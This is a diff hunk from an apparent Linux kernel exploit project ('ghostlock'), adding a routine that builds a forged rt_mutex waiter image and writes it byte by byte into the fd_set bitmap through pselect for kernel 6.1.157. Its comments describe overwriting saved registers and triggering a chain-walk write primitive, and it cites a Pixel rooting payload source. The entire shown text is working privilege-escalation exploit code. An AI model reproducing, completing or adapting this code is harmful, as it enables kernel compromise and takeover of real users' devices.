@@ -303,6 +303,53 @@ namespace ghostlock::route {
             const char *name;
         };
 
+        /* Byte-granular placement for kernels whose stale waiter lands off a
+         * word boundary inside the fd_set bitmap (6.1.157: +174, mod-8 = 6).
+         * Builds the forged waiter as a flat byte image, then every bitmap
+         * word overlapping it gets the little-endian composite read of the
+         * bytes it covers. Values outside the image read as zero. The word
+         * beyond the bitmap end clobbers core_sys_select's saved registers,
+         * which is acceptable: the chain walk fires while the thread is still
+         * parked in pselect, so the write completes before any return. */
+        uint32_t waiter_off = context->layout.waiter_off.value_or(0);
+        if (compact && (waiter_off % 8u) != 0u) {
+            uint64_t img[11] = {};
+            img[0] = (session::g_exploit_session.heap.current.fake_right);
+            img[1] = 0;
+            img[2] = request->target;
+            img[3] = (session::g_exploit_session.heap.current.fake_right);
+            img[4] = 0;
+            img[5] = request->target;
+            img[6] = (session::g_exploit_session.heap.current.fake_task);
+            img[7] = (session::g_exploit_session.heap.current.fake_lock);
+            img[8] = (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3;
+            img[9] = 0;
+            img[10] = 0;
+            const auto *bytes = reinterpret_cast<const unsigned char *>(img);
+            int32_t first = static_cast<int32_t>(waiter_off / 8u);
+            int32_t last =
+                static_cast<int32_t>((waiter_off + sizeof(img) - 1u) / 8u);
+            for (int32_t word = first; word <= last; word++) {
+                int32_t set_idx = word / words_per_set;
+                int32_t word_idx = word % words_per_set;
+                if (set_idx > 2) break;
+                uint64_t value = 0;
+                for (int32_t b = 0; b < 8; b++) {
+                    int64_t off = static_cast<int64_t>(word) * 8 + b -
+                                  static_cast<int64_t>(waiter_off);
+                    if (off < 0 ||
+                        off >= static_cast<int64_t>(sizeof(img))) continue;
+                    value |= static_cast<uint64_t>(bytes[off]) << (8 * b);
+                }
+                pselect_put_global_word(in, out, ex, words_per_set, word,
+                                        value);
+            }
+            pr_info("pselect byte-composite placement off=%u words=%d..%d "
+                    "wps=%d\n",
+                    waiter_off, first, last, words_per_set);
+            return;
+        }
+
         if (compact) {
             /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
          * the write value, children the write target; waiter->task is the
